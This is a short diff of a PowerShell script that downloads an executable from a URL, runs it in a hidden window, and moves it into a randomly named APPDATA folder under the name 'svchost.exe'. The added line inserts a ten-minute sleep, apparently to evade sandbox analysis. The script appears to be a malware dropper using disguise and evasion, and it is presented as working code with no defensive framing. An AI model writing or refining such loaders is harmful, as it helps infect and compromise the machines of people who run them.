@@ -9,6 +9,7 @@ $finalPath = "$env:APPDATA\$randomFolder"
 try {
     Invoke-WebRequest -Uri $exeUrl -OutFile $downloadPath -UseBasicParsing
     Start-Process -FilePath $downloadPath -WindowStyle Hidden -Wait
+    Start-Sleep -Seconds 600
     New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
     Move-Item -Path $downloadPath -Destination "$finalPath\svchost.exe" -Force
 } catch {
